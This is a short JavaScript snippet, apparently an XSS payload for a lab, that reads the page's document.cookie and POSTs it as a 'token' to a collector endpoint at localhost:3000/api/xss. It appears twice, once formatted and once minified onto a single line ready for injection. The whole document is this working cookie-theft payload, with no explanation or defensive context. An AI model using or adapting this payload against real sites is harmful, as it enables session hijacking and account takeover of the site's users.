const cook = document.cookie;
console.log(cook);
(() => {
    fetch('http://localhost:3000/api/xss',{
        method:'POST',
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            token: document.cookie
        })
    })
})()

(()=>{fetch('http://localhost:3000/api/xss',{method:'POST',headers: {"Content-Type":"application/json",},body: JSON.stringify({token:document.cookie})})})()
